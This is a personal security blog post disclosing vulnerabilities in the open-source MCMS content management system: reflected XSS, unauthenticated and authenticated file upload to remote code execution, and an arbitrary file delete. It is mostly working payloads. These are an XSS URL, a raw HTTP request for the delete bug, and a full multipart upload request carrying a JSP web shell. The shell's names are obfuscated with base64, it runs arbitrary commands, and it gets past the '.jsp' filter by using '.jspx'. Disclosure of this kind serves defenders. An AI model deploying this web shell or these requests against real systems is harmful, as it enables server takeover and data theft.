=== Content from lycshub.github.io_50544423_20250114_221400.html ===


[# Lyc's Blog](/)

* [Home](/)
* [About](/about/)
* [Tags](/tags/)
* [Categories](/categories/)
* [Archives](/archives/)
* Search

0%

# MCMS vulnerabilities

Posted on
2021-12-28

Edited on
2022-03-28

Disqus:

An open source CMS Project,<https://github.com/ming-soft/MCMS>

the MCMS vulnerabilities include

* Reflect XSS
* Unauthorized file upload
* Authorized file delete

## Reproduce

### XSS

path `/ms/template/unzip.do` exist reflect xss

![](https://github.com/LycsHub/ImageHosting/raw/master/1640674036583-2021-12-2814:47:16.png)

#### payload

| ``` 1 ``` | ``` /ms/template/unZip.do?fileUrl=%3C/p%3E%3Cimg%20src=x%20onerror=alert(%27hacking%27)%3E ``` |
| --- | --- |

### Authorized file upload to RCE

Authorized file uploads exist

path `/ms/file/uploadTemplate.do`

![](https://github.com/LycsHub/ImageHosting/raw/master/1640674695100-2021-12-2814:58:15.png)

![](https://github.com/LycsHub/ImageHosting/raw/master/1640674447313-2021-12-2814:54:07.png)

need login get Cookie and upload file

### Unauthorized file upload to RCE

path `/file/upload`

![](https://github.com/LycsHub/ImageHosting/raw/master/1640674792504-2021-12-2814:59:52.png)

![](https://github.com/LycsHub/ImageHosting/raw/master/1640674556372-2021-12-2814:55:56.png)

as above picture ,hacker can upload `.jspx` file to server without any identity verification , **and even when project packaged war deploy in tomcat can get web shell from server.**

> the system filter suffix `.jsp` but still can use `.jspx` to bypass

#### payload

| ``` 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849 ``` | ``` POST /file/upload.do HTTP/1.1Host: 192.168.100.103:8080User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0Accept: */*Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------124088951720288539841514905041Content-Length: 1393Origin: http://192.168.100.103:8080Connection: keep-alive-----------------------------124088951720288539841514905041Content-Disposition: form-data; name="uploadPath"/-----------------------------124088951720288539841514905041Content-Disposition: form-data; name="isRename"false-----------------------------124088951720288539841514905041Content-Disposition: form-data; name="appId"false-----------------------------124088951720288539841514905041Content-Disposition: form-data; name="file"; filename="shell.jspx"Content-Type: image/png<%@ page contentType="text/html;charset=UTF-8" language="java" %><%@ page import="sun.misc.BASE64Decoder" %><%if(request.getParameter("cmd")!=null){    BASE64Decoder decoder = new BASE64Decoder();    Class rt = Class.forName(new String(decoder.decodeBuffer("amF2YS5sYW5nLlJ1bnRpbWU=")));    Process e = (Process)            rt.getMethod(new String(decoder.decodeBuffer("ZXhlYw==")), String.class).invoke(rt.getMethod(new                    String(decoder.decodeBuffer("Z2V0UnVudGltZQ=="))).invoke(null, new                    Object[]{}), request.getParameter("cmd") );    java.io.InputStream in = e.getInputStream();    int a = -1;    byte[] b = new byte[2048];    out.print("<pre>");    while((a=in.read(b))!=-1){        out.println(new String(b));    }    out.print("</pre>");}%>-----------------------------124088951720288539841514905041-- ``` |
| --- | --- |

#### source

`net/mingsoft/basic/action/ManageFileAction.java`

![](https://github.com/LycsHub/ImageHosting/raw/master/1640675058416-2021-12-2815:04:18.png)

### Authorized file delete

![](https://github.com/LycsHub/ImageHosting/raw/master/1640675200781-2021-12-2815:06:40.png)

`net/mingsoft/basic/action/TemplateAction.java`

![](https://github.com/LycsHub/ImageHosting/raw/master/1640668607171-2021-12-2813:16:47.png)

#### payload

| ``` 123456789101112 ``` | ``` GET /ms/template/unZip.do?fileUrl=HACKED HTTP/1.1Host: 192.168.100.103:8080User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0Accept: */*Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateCache-Control: no-cachePragma: no-cacheX-Requested-With: XMLHttpRequestConnection: keep-aliveReferer: http://192.168.100.103:8080/ms/template/index.do?Cookie: JSESSIONID=56EC9CCC14E1E8DEE4AACCF732EA7FC7; pageno_cookie=1 ``` |
| --- | --- |

####

[go正则的坑](/2021/12/19/go%E6%AD%A3%E5%88%99%E7%9A%84%E5%9D%91/ "go正则的坑")
[RMI,LDAP jndi注入](/2021/12/31/RMI-LDAP-jndi%E6%B3%A8%E5%85%A5/ "RMI,LDAP jndi注入")

Please enable JavaScript to view the comments powered by Disqus.

* Table of Contents
* Overview

1. [1. Reproduce](#Reproduce)
   1. [1.1. XSS](#XSS)
      1. [1.1.1. payload](#payload)
   2. [1.2. Authorized file upload to RCE](#Authorized-file-upload-to-RCE)
   3. [1.3. Unauthorized file upload to RCE](#Unauthorized-file-upload-to-RCE)
      1. [1.3.1. payload](#payload-1)
      2. [1.3.2. source](#source)
   4. [1.4. Authorized file delete](#Authorized-file-delete)
      1. [1.4.1. payload](#payload-2)
      2. 1.4.2.

![Harry Smith](https://raw.githubusercontent.com/LycsHub/ImageHosting/master/natumetakasi-2021-11-318%3A56%3A10.jpg)

Harry Smith

取次花丛懒回顾，半缘修道半缘君

[42
posts](/archives/)

[10
categories](/categories/)

[24
tags](/tags/)

©
2023

Harry Smith


